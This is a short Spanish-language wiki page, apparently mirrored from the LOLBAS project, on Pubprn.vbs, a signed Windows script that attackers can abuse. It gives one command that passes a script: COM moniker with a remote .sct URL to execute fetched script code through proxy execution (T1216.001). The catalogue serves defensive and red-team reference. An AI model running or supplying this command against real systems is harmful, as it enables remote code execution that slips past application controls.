# LOLBAS: Pubprn.vbs

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Proxy execution with Pubprn.vbs

## Comandos

### Proxy execution

Execute · priv: User · T1216.001

```cmd
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
```

Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection

